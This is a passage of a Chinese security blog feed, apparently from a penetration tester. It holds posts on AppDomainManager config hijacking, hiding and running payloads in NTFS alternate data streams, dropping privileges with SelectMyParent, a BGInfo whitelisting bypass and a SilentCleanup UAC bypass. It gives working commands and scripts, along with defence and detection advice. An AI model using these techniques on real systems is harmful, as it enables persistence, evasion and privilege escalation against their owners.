version=&quot;v4.0&quot; sku=&quot;.NETFramework,Version=v4.0&quot;/&gt; &lt;/startup&gt; &lt;runtime&gt; &lt;appDomainManagerType value=&quot;DomainManager.InjectedDomainManager&quot; /&gt; &lt;appDomainManagerAssembly value=&quot;DomainManager, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null&quot; /&gt; &lt;/runtime&gt; &lt;/configuration&gt; 注： config文件命名格式：exe+.config 成功实现劫持，完整操作如下图 0x04 劫持系统.Net程序powershell_ise.exe 接下来，需要找到可供利用的系统.Net程序，尝试实现持久性后门 这里选取powershell_ise.exe作为演示 注： powershell_ise.exe：全称Windows PowerShell Integrated Scripting Environment（集成脚本环境） 图形界面，主要用于编写和调试powershell脚本 操作界面如下图 为了便于演示，我们需要修改工程DomainManager，使其在运行时弹框 1、添加引用工程-右键-添加引用，选择System.Windows.Forms 如下图 代码修改如下： using System; using System.Windows.Forms; namespace DomainManager { public class InjectedDomainManager : AppDomainManager { public override void InitializeNewDomain(AppDomainSetup appDomainInfo) { base.InitializeNewDomain(appDomainInfo); Console.WriteLine(&quot;Blah From AppMgr&quot;); MessageBox.Show(&quot;1&quot;); } } } 重新编译生成DomainManager.dll 2、测试劫持program.exe成功，如下图 劫持powershell_ise.exe： （1） 测试test目录 将powershell_ise.exe复制到c:\test 在同级目录新建powershell_ise.exe.config,config文件可作适当精简，精简后的内容如下： &lt;?xml version=&quot;1.0&quot;?&gt; &lt;configuration&gt; &lt;startup&gt; &lt;supportedRuntime version=&quot;v4.0&quot; /&gt; &lt;/startup&gt; &lt;runtime&gt; &lt;appDomainManagerType value=&quot;DomainManager.InjectedDomainManager&quot; /&gt; &lt;appDomainManagerAssembly value=&quot;DomainManager&quot; /&gt; &lt;/runtime&gt; &lt;/configuration&gt; 在c:\test目录下启动powershell_ise.exe 成功劫持powershell_ise.exe （2）测试powershell_ise.exe默认目录 路径如下： C:\Windows\System32\WindowsPowerShell\v1.0 需要管理员权限，在默认目录创建劫持文件DomainManager.dll和powershell_ise.exe.config 编译任意powershell脚本，默认启动powershell_ise.exe，成功劫持 完整操作如下图 0x05 一种针对Visual Studio的利用思路 对于Visual Studio的c#工程，在工程目录下默认存在文件App.config，内容如下： &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt; &lt;configuration&gt; &lt;startup&gt; &lt;supportedRuntime version=&quot;v4.0&quot; sku=&quot;.NETFramework,Version=v4.5&quot; /&gt; &lt;/startup&gt; &lt;/configuration&gt; 如果对其修改，添加劫持功能，那么在编译程序时，也会同步修改bin目录下默认生成的config文件 App.config修改如下： &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt; &lt;configuration&gt; &lt;startup&gt; &lt;supportedRuntime version=&quot;v4.0&quot; sku=&quot;.NETFramework,Version=v4.5&quot; /&gt; &lt;/startup&gt; &lt;runtime&gt; &lt;appDomainManagerType value=&quot;DomainManager.InjectedDomainManager&quot; /&gt; &lt;appDomainManagerAssembly value=&quot;DomainManager&quot; /&gt; &lt;/runtime&gt; &lt;/configuration&gt; 编译程序，bin目录下的config文件也被修改，如下图 如果在bin目录也放置DomainManager.dll，那么在程序启动时会被劫持，如下图 0x06 小结 本文介绍了一种通过修改AppDomainManager实现的被动后门触发机制，分析了利用思路，站在防御者的角度，只需要留意.Net程序同级目录下的config文件就好 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[Hidden Alternative Data Streams的进阶利用技巧]]></title>
    <url>%2Fposts%2Fc3245d3a.html</url>
    <content type="text"><![CDATA[0x00 前言 在渗透测试中，ADS(供选数据流/ alternate data stream)通常用于在文件中隐藏payload，这种方式最大的优点是不影响文件大小，普通用户很难察觉 为此，微软提供了&quot;dir /r&quot;操作，可用来查看文件的ADS，同时，Win XP以后的系统禁止用户从ADS里直接执行程序，限制了ADS的利用 然而，通过一些特殊用法和技巧，我们能够更好的隐藏ADS，并且能够从ADS里直接执行程序 ：） 说明： 写本文的初衷是偶然看到了一篇有趣的文章，作者：lex Inführ，地址如下： http://insert-script.blogspot.co.at/2012/11/hidden-alternative-data-streams.html 该文章介绍了一些绕过ADS检测工具的技巧，并给出了通过wmi执行ADS的方法 本文将基于lex Inführ的文章，结合我的研究心得，对ADS的利用技巧作扩充，分享如何清除这些特殊的ADS，帮助大家提升对ADS的认识 0x01 简介 本文将要介绍以下内容： ADS常规利用方法 ADS常规检测工具 特殊ADS对检测工具的绕过 特殊ADS的清除 防御建议 0x02 常规利用 ADS：适用于NTFS文件系统,基础知识可参考如下文章： http://www.freebuf.com/articles/73270.html 创建ADS：对文件，命令行： echo test1 &gt; test.txt:ThisIsAnADS 创建成功后，test.txt文件大小不变 对文件夹，命令行： echo test1 &gt; c:\test\ads\1:ThisIsAnADS 注： 需要绝对路径 查看文件中的ADS：命令行： dir /r 如图 可获得文件夹和文件中包含的ADS信息 查看ADS内容：命令行： more &lt; test.txt:ThisIsAnADS 如下图，获得ADS的具体内容 删除ADS:命令行： more &lt; test.txt &gt; testcopy.txt 使用more命令查看文件的主数据流并输出，即可变相实现ADS的删除 如下图，testcopy.txt不包含多余ADS 注： more命令在显示较长数据时会截断，逐屏显示输出，这里面就存在一个bug，如果文件过大，导致more命令需要分屏显示的时候，就会造成数据显示不完整，导致文件生成失败 0x03 ADS的执行 1、通过wmi命令行： type putty.exe &gt; test.txt:putty.exe wmic process call create c:\test\test.txt:putty.exe 如图 程序执行后，进程名为test.txt:putty.exe 2、通过powershell代码如下： $ps = new-object System.Diagnostics.Process $ps.StartInfo.Filename= &quot;c:\test\test.txt:putty.exe&quot; $ps.StartInfo.RedirectStandardOutput = $True $ps.StartInfo.UseShellExecute = $False $ps.start() 0x04 常规检测工具 1、ADSCheck.exe下载地址： https://sourceforge.net/projects/adscheck/ 查看ADS： 可查看指定文件夹下所有文件 命令： ADSCheck.exe c:\test\ads 如图 删除ADS： 可删除指定路径下的所有ADS 命令： ADSCheck.exe c:\test\ads /d 如图 2、Streams.exe下载地址： https://technet.microsoft.com/en-us/sysinternals/streams.aspx 查看ADS： 查看单个文件 命令： streams.exe c:\test\ads\test.txt 如图 删除ADS： 删除单个文件的ADS 命令： streams.exe -d c:\test\ads\test.txt 如图 实例测试：浏览器下载的文件在打开时会弹框提示 如图 原因： 下载的文件默认添加adsZone.Identifier:$DATA 验证： 查看ADS： more &lt; putty_download.exe:Zone.Identifier:$DATA 获得内容如下： [ZoneTransfer] ZoneId=3 去除ADS： 无法使用more命令，因为putty_download.exe过大，需要分屏显示，导致文件生成失败 可使用streams.exe 去除ADS后，打开文件不再弹框提示 0x05 特殊ADS 1、…文件创建特殊文件… 命令如下： type putty.exe &gt; ...:putty.exe wmic process call create c:\test\ads\...:putty.exe putty.exe成功执行,进程名为...:putty.exe 特别的地方： (1) ADS被隐藏 dir /r无法查询 工具ADSCheck.exe和streams.exe显示不存在ADS 如图 (2) 该文件无法被删除 尝试各种方法，无法删除，如图 2、特殊COM文件创建特殊名称文件COM1 注： 经测试，系统目前支持的文件名称为COM1至COM9必须有前缀\\.\，否则提示系统找不到指定文件 补充1： 特殊名称nul也有同样效果,该方法由Evi1cg测试得出 补充2： 其他特殊文件格式也可以隐藏ADS，包括如下格式的后缀名： CON、AUX、PRN、LPT1、LPT2、LPT3、LPT4、LPT5、LPT6、LPT7、LPT8、LPT9 eg： type putty.exe &gt; \\.\C:\test\ads\LPT4:putty.exe 补充3： 也可以使用前缀\\?\，具有相同效果 命令如下： type putty.exe &gt; \\.\C:\test\ads\COM1:putty.exe wmic process call create \\.\C:\test\ads\COM1:putty.exe 注： 执行wmic process call create c:\test\ads\COM1:putty.exe不会执行程序 putty.exe成功执行,进程名为COM1:putty.exe 特别的地方： (1) ADS被隐藏 dir /r无法查询 工具ADSCheck.exe和streams.exe显示不存在ADS (2) 无法直接删除 3、磁盘根目录管理员权限 type putty.exe &gt;C:\:putty.exewmic process call create C:\:putty.exe putty.exe成功执行,进程名为:putty.exe 特别的地方： (1) ADS被隐藏 dir /r 无法查到 使用streams.exe可以查看 (2) 无法直接删除 0x06 特殊ADS的清除 1、…文件方法1： 删除该目录下所有文件： del *.* 但是不现实 方式2： 使用短文件名 dir /x 如图 找到…文件对应的短文件名为A535~1 命令行： del A535~1 成功删除 2、特殊COM文件命令行： del \\.\C:\test\ads\COM1 3、磁盘根目录使用streams.exe 管理员权限： streams.exe -d C:\ 0x07 防御建议 对于用户来说，如果在系统中发现特殊名称的文件并且无法删除，需要提高警惕，也许其中会包含payload 对照本文，特殊文件及清除方法如下： (1) … 借助短文件名删除 (2) COM1-COM9 del \.\C:\test\ads\COM1 (3) 磁盘根目录 借助streams.exe查看和删除 0x08 小结 本文介绍了进一步隐藏ADS的利用技巧，结合攻击方式分享了具体的清除方法和防御建议，希望能够帮助大家 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[渗透技巧——程序的降权启动]]></title>
    <url>%2Fposts%2F4938aaf1.html</url>
    <content type="text"><![CDATA[0x00 前言 在渗透测试中，常常会遇到需要改变程序启动权限（分为提权和降权）的情况。 提权包含从普通用户权限到管理员权限和从管理员权限到system权限，而渗透测试中的降权通常是指从system权限降到普通用户权限（从管理员权限降到普通用户权限比较简单，方法很多），往往是为了操作当前用户的文件内容（如捕获桌面、操作注册表等） 本文将会介绍具体的降权方法（从system权限降到普通用户权限），理清其中的重点，并且开源一个小工具，用于判断进程权限 0x01 简介 本文将要介绍以下内容： 为什么要降权 从管理员权限降到普通用户权限的方法 从system权限降到普通用户权限的方法 利用SelectMyParent实现提权和降权 注： 测试系统： Win7 0x02 为什么要降权 使用sytem权限的进程可能会遇到以下问题: 1、无法获得当前用户的文件内容 例如无法捕获用户的屏幕 2、环境变量有差异 比如以下环境变量： APPDATA Temp Tmp USERDOMAIN USERNAME USERPROFILE cmd下可通过echo查看环境变量，例如查看环境变量APPDATA的命令为： echo %appdata% system权限下，查询到的环境变量APPDATA为C:\Windows\system32\config\systemprofile\AppData\Roaming 管理员权限下，查询到的环境变量APPDATA为C:\Users\a\AppData\Roaming 如下图 通过API SHGetSpecialFolderPath 获取指定的系统路径，如APPDATA，也能发现权限不同导致的区别 c++代码如下： #include &lt;windows.h&gt; #include &lt;Shlobj.h&gt; bool IsSystemPrivilegeCmp() { static bool isSystemPrivilege = false; char *flag=&quot;C:\\Windows&quot;; if (isSystemPrivilege) { return isSystemPrivilege; } char szPath[MAX_PATH] = {0}; if (SHGetSpecialFolderPathA(NULL, szPath, CSIDL_APPDATA, TRUE)) { printf(&quot;APPDATA Path:%s\n&quot;,szPath); if(memcmp(szPath,flag,strlen(flag))==0) printf(&quot;[+]I&#39;m System Privilege\n&quot;); else printf(&quot;[-]Not System Privilege\n&quot;); } return isSystemPrivilege; } int main(int argc, CHAR* argv[]) { IsSystemPrivilegeCmp(); return 0; } 如下图 注： SHGetSpecialFolderPath支持查询的系统路径可在Shlobj.h中获取 如下图 3、注册表有差异 对HKCU的部分注册表操作会被重定向到HKEY_USERS.DEFAULT 如下图 0x03 从管理员权限降到普通用户权限的方法 1、runascmd： runas /user:a calc.exe 接着输入密码：123456 calc.exe的权限为用户a的权限 如下图 缺点： 需要等待用户手动输入密码，不够自动化 但是可以借助管道实现自动输入密码，需要借助第三方工具Sanur，方法不具体介绍 2、第三方工具：lsrunas下载地址： http://www.verydoc.com/exeshell.html cmd： lsrunas.exe /user:a /password:123456 /domain: /command:&quot;calc.exe&quot; /runpath:c:\ 注： /domain:参数为空表示为本机 从管理员权限降权到普通用户权限，成功，如下图 3、第三方工具：CPAU下载地址可参考我的github： https://github.com/3gstudent/From-System-authority-to-Medium-authority cmd： CPAU.exe -u a -p 123456 -ex &quot;calc.exe&quot; -lwp 注： 必须添加参数-lwp或-lwop，否则无法实现降权 从管理员权限降权到普通用户权限，成功，如下图 4、powershell代码如下： $uname=&quot;a&quot; $pwd=ConvertTo-SecureString &quot;123456&quot; -AsPlainText –Force $cred=New-Object System.Management.Automation.PSCredential($uname,$pwd) Start-Process -FilePath &quot;calc.exe&quot; -Credential $cred 5、c++使用API： CreateProcessAsUser CreateProcess 0x04 从system权限降到普通用户权限的方法 注： 本次测试的system权限通过漏洞获取 1、runascmd： runas /user:a calc.exe 接着输入密码：123456 成功降权，但启动失败，如下图 2、第三方工具：lsrunascmd： lsrunas.exe /user:a /password:123456 /domain: /command:&quot;calc.exe&quot; /runpath:c:\ 同上，成功降权，但启动失败 3、第三方工具：CPAUcmd： CPAU.exe -u a -p 123456 -ex &quot;calc.exe&quot; -lwp CPAU不支持system权限启动，如下图 4、powershell同1，成功降权，但启动失败 5、c++可以使用Didier Stevens的工具SelectMyParent 注： 该代码尚未在github共享，所以我在我的github上传了该代码，并注明作者为Didier Stevens 代码地址： https://github.com/3gstudent/From-System-authority-to-Medium-authority/blob/master/SelectMyParent.cpp SelectMyParent：用来创建具有选定父进程的windows进程 例如：创建新进程calc.exe，使用SelectMyParent可以将新进程calc.exe设置为进程winlogon.exe的子进程 使用步骤： 1、获取进程winlogon.exe的pid 在我的测试系统中，进程winlogon.exe的pid为504 2、启动SelectMyParent 参数如下： SelectMyParent.exe calc.exe 504 显示calc.exe为winlogon.exe的子进程，如下图 该方法主要可以用来提高进程的隐蔽性，欺骗用户 特别的地方： 由于子进程会继承父进程的权限，并且winlogon.exe的权限为system，那么其子进程calc.exe的权限也将会成为system 如下图 也就是说，我们可以基于SelectMyParent实现以下提权和降权操作： 提权：从管理员权限到system权限 降权：从system权限到admin权限 降权：从system权限到普通用户权限 操作步骤： 1、获取进程pid cmd下获取进程pid的方法： tasklist /v /fo list 可获取每个进程对应的pid及权限(用户名的值表示)，如下图 为了方便测试，可以使用过滤将特定权限的进程筛选出来，例如筛选NT AUTHORITY\SYSTEM 命令如下： tasklist /v /fo list /fi &quot;USERNAME eq NT AUTHORITY\SYSTEM&quot; 如果是获取普通用户权限的进程，筛选的USERNAME可设置为whoami的返回结果 2、使用SelectMyParent.exe 从管理员权限到system权限： 上文已经演示，不再重复介绍 从system权限到admin权限： 通过tasklist无法区分进程是否是管理员权限还是普通用户权限 于是我通过c++写了一个小工具，作用如下： 遍历进程 判断进程权限，如果为管理员权限，进行标记 代码下载地址： https://github.com/3gstudent/From-System-authority-to-Medium-authority/blob/master/Processauthority.cpp 工具使用如下图 从system权限到普通用户权限： 选取普通用户权限进程，pid为3864，创建的calc.exe权限也会具有普通用户权限，如下图 成功实现从system权限到普通用户权限的降权 0x05 小结 本文对常用降权方法进行测试，结论是有些条件下降权方法会失效，通用的方式是使用SelectMyParent进行降权。 结合实际，开源了遍历判断进程权限的小工具，用于提高效率。 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[Study Notes of using BGInfo to bypass Application Whitelisting]]></title>
    <url>%2Fposts%2F6901b884.html</url>
    <content type="text"><![CDATA[0x00 前言 最近看到一篇有趣的文章《Bypassing Application Whitelisting with BGInfo》，介绍了如何通过BGInfo实现白名单绕过，我对此很感兴趣，于是对这部分内容做了学习整理，同时开源了一个powershell脚本，用于自动生成.bgi文件 文章地址如下： https://msitpros.com/?p=3831 0x01 简介 本文将要介绍如下内容： Bginfo简介 通过Bginfo绕过白名单的实际操作 如何使用powershell编辑二进制文件 如何开发powershell脚本自动生成.bgi文件 0x02 Bginfo Bginfo—强大的Windows系统信息显示工具,出自Sysinternals套件 下载地址： https://technet.microsoft.com/en-us/sysinternals/bb897557.aspx 注： bginfo.exe最新版本为4.22，本文测试版本为4.21 1、简介可以自动在桌面的一个区域中显示当前Windows环境信息 面板如图 设置后，桌面显示Windows环境信息，如图 编辑要显示的信息，可将其保存为config.bgi，使用时将其导入就好 2、Bginfo命令行模式/h 弹出帮助 如图 通过命令行设置桌面显示信息的命令如下： bginfo.exe config.bgi /timer:0 /nolicprompt /silent 3、扩展：点击Custom可自定义桌面显示内容，如图 选择New 设置数据源，包括环境变量、注册表键值、WMI、文件、VB Script脚本 4、导入WMI查询：添加一个WMI查询，如图 在面部添加显示内容，修改桌面，成功显示新内容，如图 5、导入VBS：添加一个vbs查询,vbs脚本可参考： https://gist.githubusercontent.com/api0cradle/efc90f8318556f0737791b6d73a4ec8b/raw/9a46f4cdacb5752e721e1e3701308939351b4768/gistfile1.txt 该vbs脚本实现： 启动cmd.exe 在桌面输出：”Does not matter what this says” 导入该vbs脚本后，点击Apply，成功弹出cmd.exe，并在桌面输出Does not matter what this says 如图 整个启动过程还可在cmd下实现 (1) 将上述bgi工程保存为vbs.bgi (2) cmd： bginfo.exe vbs.bgi /timer:0 /nolicprompt /silent 6、bginfo.exe和vbs.bgi可以放在远程服务器，通过网络共享访问执行cmd： \\WIN-FVJLPTISCFE\test\bginfo.exe \\WIN-FVJLPTISCFE\test\test1.bgi /timer:0 /nolicprompt /silent 完整操作如图 0x03 通过Bginfo绕过白名单 完整过程如下： 1、启动bginfo.exe，添加导入vbs脚本功能，设置vbs脚本路径，去掉桌面显示内容 2、将bgi工程保存为.bgi文件 3、命令行执行代码： bginfo.exe vbs.bgi /timer:0 /nolicprompt /silent 注： bginfo.exe的版本需要低于4.22，版本4.22已经修复上述问题 整个绕过过程很简单，但是步骤1和步骤2比较麻烦，通过UltraEdit查看vbs.bgi，内容如图 看起来遵循一定的格式，那么能否通过powershell脚本实现自动生成.bgi文件呢？ 0x04 bgi文件格式 通过文件比较来猜测bgi文件格式 使用16进制文件比较工具：Beyond Compare 分别设置不同的vbs路径，对比差别，如图 不难发现，差异只存在于0x00000301和0x00000306开始的vbs路径 0x00000000-0x0x00000300为固定格式 字符串C：\test\1.vbs的长度为13，0x00000301标志位数值为0x0F，10进制为15 字符串C：\test\cmd.vbs的长度为15，0x00000301标志位数值为0x11，10进制为17 大胆猜测： 0x00000301的标志位表示内容为：vbs路径长度+2，并转换成16进制保存 注： vbs路径C：\test\1.vbs中的磁盘目录C需要大写，否则提示文件格式错误 0x05 如何使用powershell编辑二进制文件 使用powershell读写文件，最常用的方式为： 读文件： Get-content写文件： Set-content 然而，对于不是txt的文件，如果存在特殊字符，通过以上方法会出现bug，自动过滤特殊字符串，导致长度不同，内容出错 读写二进制文件方法： 读二进制文件： [System.IO.File]::ReadAllBytes(&#39;1.txt&#39;) 写二进制文件： [System.IO.File]::WriteAllBytes(&quot;1.txt&quot;,$fileContentBytes) 修改二进制文件： 使用system.io.filestream 代码如下： $fs=new-object io.filestream &quot;test1.bgi&quot;,open $fs.seek(0,2) $fs.writebyte(0x00) $fs.flush() $fs.close() 参数说明： $fs=new-object io.filestream “test1.bgi”,open： open表示追加，createnew表示新建 $fs.seek(0,2)： 第一个参数表示偏移 第二个参数：0表示以文件开头作为起点，1表示以当前位置作为起点，2表示以文件末尾作为起点 0x06 编写powershell脚本实现自动生成.bgi文件 开发思路： 读取0x00000000-0x0x00000300内容，作base64编码并保存在变量$fileContent中 对变量$fileContent作base64解码，写入新文件test1.bgi 使用追加方式向文件依次写入标志位，vbs路径和其他填充位 流程如下: 写入0x00000000-0x0x00000300内容 计算标志位 以二进制方式写入标志位 使用Out-File向文件追加写入vbs路径，但是会存在冗余数据0D0A 偏移-2，以二进制方式填充其他位置，覆盖冗余数据0D0A 关键代码如下: 将0x00000000-0x0x00000300内容保存为1.bgi powershell代码： $fileContent = [System.IO.File]::ReadAllBytes(&#39;1.bgi&#39;) $fileContentEncoded = [System.Convert]::ToBase64String($fileContent)| set-content (&quot;buffer.txt&quot;) 生成buffer.txt，内容如下： CwAAAEJhY2tncm91bmQABAAAAAQAAAAAAAAACQAAAFBvc2l0aW9uAAQAAAAEAAAA/gMAAAgAAABNb25pdG9yAAQAAAAEAAAAXAQAAA4AAABUYXNrYmFyQWRqdXN0AAQAAAAEAAAAAQAAAAsAAABUZXh0V2lkdGgyAAQAAAAEAAAAwHsAAAsAAABPdXRwdXRGaWxlAAEAAAASAAAAJVRlbXAlXEJHSW5mby5ibXAACQAAAERhdGFiYXNlAAEAAAABAAAAAAwAAABEYXRhYmFzZU1SVQABAAAABAAAAAAAAAAKAAAAV2FsbHBhcGVyAAEAAAABAAAAAA0AAABXYWxscGFwZXJQb3MABAAAAAQAAAACAAAADgAAAFdhbGxwYXBlclVzZXIABAAAAAQAAAABAAAADQAAAE1heENvbG9yQml0cwAEAAAABAAAAAAAAAAMAAAARXJyb3JOb3RpZnkABAAAAAQAAAAAAAAACwAAAFVzZXJTY3JlZW4ABAAAAAQAAAABAAAADAAAAExvZ29uU2NyZWVuAAQAAAAEAAAAAAAAAA8AAABUZXJtaW5hbFNjcmVlbgAEAAAABAAAAAAAAAAOAAAAT3BhcXVlVGV4dEJveAAEAAAABAAAAAAAAAAEAAAAUlRGAAEAAADvAAAAe1xydGYxXGFuc2lcYW5zaWNwZzkzNlxkZWZmMFxkZWZsYW5nMTAzM1xkZWZsYW5nZmUyMDUye1xmb250dGJse1xmMFxmbmlsXGZjaGFyc2V0MTM0IEFyaWFsO319DQp7XGNvbG9ydGJsIDtccmVkMjU1XGdyZWVuMjU1XGJsdWUyNTU7fQ0KXHZpZXdraW5kNFx1YzFccGFyZFxmaS0yODgwXGxpMjg4MFx0eDI4ODBcY2YxXGxhbmcyMDUyXGJccHJvdGVjdFxmMFxmczI0IDx2YnM+XHByb3RlY3QwXHBhcg0KXHBhcg0KfQ0KAAALAAAAVXNlckZpZWxkcwAAgACAAAAAAAQAAAB2YnMAAQAAAA== 将其保存在变量$fileContent中，解密并写入文件test1.bgi $fileContent = &quot;CwAAAEJhY2tncm91bmQABAAAAAQAAAAAAAAACQAAAFBvc2l0aW9uAAQAAAAEAAAA/gMAAAgAAABNb25pdG9yAAQAAAAEAAAAXAQAAA4AAABUYXNrYmFyQWRqdXN0AAQAAAAEAAAAAQAAAAsAAABUZXh0V2lkdGgyAAQAAAAEAAAAwHsAAAsAAABPdXRwdXRGaWxlAAEAAAASAAAAJVRlbXAlXEJHSW5mby5ibXAACQAAAERhdGFiYXNlAAEAAAABAAAAAAwAAABEYXRhYmFzZU1SVQABAAAABAAAAAAAAAAKAAAAV2FsbHBhcGVyAAEAAAABAAAAAA0AAABXYWxscGFwZXJQb3MABAAAAAQAAAACAAAADgAAAFdhbGxwYXBlclVzZXIABAAAAAQAAAABAAAADQAAAE1heENvbG9yQml0cwAEAAAABAAAAAAAAAAMAAAARXJyb3JOb3RpZnkABAAAAAQAAAAAAAAACwAAAFVzZXJTY3JlZW4ABAAAAAQAAAABAAAADAAAAExvZ29uU2NyZWVuAAQAAAAEAAAAAAAAAA8AAABUZXJtaW5hbFNjcmVlbgAEAAAABAAAAAAAAAAOAAAAT3BhcXVlVGV4dEJveAAEAAAABAAAAAAAAAAEAAAAUlRGAAEAAADvAAAAe1xydGYxXGFuc2lcYW5zaWNwZzkzNlxkZWZmMFxkZWZsYW5nMTAzM1xkZWZsYW5nZmUyMDUye1xmb250dGJse1xmMFxmbmlsXGZjaGFyc2V0MTM0IEFyaWFsO319DQp7XGNvbG9ydGJsIDtccmVkMjU1XGdyZWVuMjU1XGJsdWUyNTU7fQ0KXHZpZXdraW5kNFx1YzFccGFyZFxmaS0yODgwXGxpMjg4MFx0eDI4ODBcY2YxXGxhbmcyMDUyXGJccHJvdGVjdFxmMFxmczI0IDx2YnM+XHByb3RlY3QwXHBhcg0KXHBhcg0KfQ0KAAALAAAAVXNlckZpZWxkcwAAgACAAAAAAAQAAAB2YnMAAQAAAA==&quot; $fileContentBytes = [System.Convert]::FromBase64String($fileContent) [System.IO.File]::WriteAllBytes(&quot;test1.bgi&quot;,$fileContentBytes) 标志位计算： $VbsPath=&quot;C:\test\1.vbs&quot; $Length=$VbsPath.Length+2 写入长度标志位+空闲填充位 $fs=new-object io.filestream &quot;test1.bgi&quot;,open $fs.seek(0,2) $fs.writebyte($Length) $fs.writebyte(0x00) $fs.writebyte(0x00) $fs.writebyte(0x00) $fs.writebyte(0x34) $fs.flush() $fs.close() 追加写入vbs脚本路径： $VbsPath | Out-File -Encoding ascii -Append test1.bgi 存在冗余数据0D0A，所以偏移应该为-2，写入空闲填充位： $fs=new-object io.filestream &quot;test1.bgi&quot;,open $fs.seek(-2,2) $fs.writebyte(0x00) $fs.writebyte(0x00) $fs.writebyte(0x00) $fs.writebyte(0x00) $fs.writebyte(0x00) $fs.writebyte(0x01) $fs.writebyte(0x80) $fs.writebyte(0x00) $fs.writebyte(0x80) $fs.writebyte(0x00) $fs.writebyte(0x00) $fs.writebyte(0x00) $fs.writebyte(0x00) $fs.flush() $fs.close() 完整代码已上传至github： https://github.com/3gstudent/bgi-creater 完整操作如图 0x07 小结 本文介绍了通过BGInfo实现白名单绕过的方法，同时介绍了通过powershell编辑二进制文件的方法，开源了一个powershell生成.bgi文件的脚本，希望能够帮助大家 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[Study Notes of using SilentCleanup to bypass UAC]]></title>
    <url>%2Fposts%2F504bed02.html</url>
    <content type="text"><![CDATA[0x00 前言 最近我在James Forshaw‏的博客学到了一个Win10下绕过UAC的技巧，该方法通过脚本实现，并且目前微软还未对该绕过方法进行修复（预计在Win10 RS3修复）。经过我的学习测试，该方法同样适用于Win8，并且文中介绍的绕过思路很值得学习，因此整理成文，分享给大家。 文章地址如下： https://tyranidslair.blogspot.co.uk/2017/05/exploiting-environment-variables-in.html 0x01 简介 本文将要介绍以下内容： 绕过思路 利用方法 防御检测 0x02 绕过思路 在之前文章也分享过一些绕过UAC思路的心得，可参考以下文章： https://3gstudent.github.io/3gstudent.github.io/Study-Notes-of-using-sdclt.exe-to-bypass-UAC/ https://3gstudent.github.io/3gstudent.github.io/Study-Notes-Weekly-No.1(Monitor-WMI_ExportsToC++_Use-DiskCleanup-bypass-UAC)/ 个人认为寻找绕过UAC的方法可分为以下两个步骤： 1、寻找权限控制不严格的程序 通常具有以下特点： 以普通用户权限启动程序 程序默认以高权限启动，通常标记为Highest 2、该程序启动过程是否可被劫持 启动路径是否可被劫持 启动过程加载的问题（如dll）是否可被劫持 0x03 利用方法 对应到James Forshaw‏的方法，也是优先寻找权限控制不严格的程序——计划任务中的SilentCleanup 注： Matt Nelson之前也介绍过一个利用SilentCleanup绕过UAC的方法，目前已被修复，文章地址如下： https://enigma0x3.net/2016/07/22/bypassing-uac-on-windows-10-using-disk-cleanup/ 计划任务中的SilentCleanup： 普通用户权限即可启动 启动后自动提升为高权限 通过Powershell可以获取更多细节,代码如下： $task = Get-ScheduledTask SilentCleanup $task.Principal 注： Win7默认powershell版本2.0，不支持Get-ScheduledTask操作 如下图 Authenticated Users表示普通用户权限即可启动 RunLevel为Highest表示以高权限启动 查看启动参数，powershell代码如下： $task.Actions[0] 如下图 启动参数为%windir%\system32\cleanmgr.exe 这里存在一个可供利用的地方——环境变量%windir% 注： 可通过set windir查看环境变量%windir% %windir%默认指向c:\Windows 如果修改当前系统环境变量，指向其他路径，那么这里就实现了一个劫持 例如： 将%windir%设置为c:\test 在c:\test\system32\下将payload.exe保存为cleanmgr.exe 那么在启动计划任务SilentCleanup时，就会以高权限启动payload.exe，实现了UAC绕过 更直接的利用方法： 将%windir%设置为cmd /K，那么在启动计划任务SilentCleanup时会弹出cmd.exe 注: cmd后面需要加参数，否则由于参数问题导致无法正常启动 /k表示弹出的cmd.exe在执行代码后不退出 为了增加隐蔽性（很多程序在启动时需要调用环境变量%windir%），在执行cmd的需要同时删除新添加的注册表键值windir，可以使用如下代码： reg add hkcu\Environment /v windir /d &quot;cmd /K reg delete hkcu\Environment /v windir /f &amp;&amp; REM &quot; schtasks /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I 注： 以上代码来自于https://gist.github.com/tyranid/729b334bf9dc0f38184dbd47ae3f52d0#file-disk_cleanup_uac_bypass-bat 将环境变量设置为cmd /K reg delete hkcu\Environment /v windir /f &amp;&amp; REM，那么在启动计划任务SilentCleanup时会弹出cmd.exe，接着执行删除注册表键值的命令：reg delete hkcu\Environment /v windir /f 完整操作如下图 注: 参数如果换成/a，那么cmd.exe在执行后面的命令后会立即退出 0x04 防御检测 1、防御修改计划任务SilentCleanup的启动参数，将环境变量去掉，换成c:\Windows，锁定路径 管理员权限： $action = New-ScheduledTaskAction -Execute $env:windir\System32\cleanmgr.exe -Argument &quot;/autoclean /d $env:systemdrive&quot; Set-ScheduledTask SilentCleanup -TaskPath \Microsoft\Windows\DiskCleanup -Action $action 注： 以上代码来自于https://gist.github.com/tyranid/9ef39228ba0acc6aa4039d2218006546#file-fix_diskclean_uac_bypass-ps1 如下图 计划任务SilentCleanup的启动参数被修改为c:\windows\system32\cleanmgr.exe，无法通过修改环境变量%windir%对其劫持 2、检测通过powershell寻找计划任务中是否还存在可供利用的服务，代码如下： $tasks = Get-ScheduledTask | Where-Object { $_.Principal.RunLevel -ne &quot;Limited&quot; -and $_.Principal.LogonType -ne &quot;ServiceAccount&quot; -and $_.State -ne &quot;Disabled&quot; -and $_.Actions[0].CimClass.CimClassName -eq &quot;MSFT_TaskExecAction&quot; } 注： 以上代码来自于https://gist.github.com/tyranid/92e1c7074a9a7b0d5d021e9218e34fe7#file-get_scheduled_tasks-ps1 如下图，可供利用的服务一共有四个，经测试，其他三个无法实际利用，只有SilentCleanup有效 0x05 补充 该方法同样适用于Win8环境，完整操作如下图 Win7系统不包含计划任务SilentCleanup，因此无法利用 0x06 小结 本文介绍了通过计划任务SilentCleanup绕过UAC的方法，该方法仅需要通过脚本向当前用户注册表写入键值即可，简单有效。 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[逆向分析——使用IDA动态调试WanaCrypt0r中的tasksche.exe]]></title>
    <url>%2Fposts%2Fd57cf723.html</url>
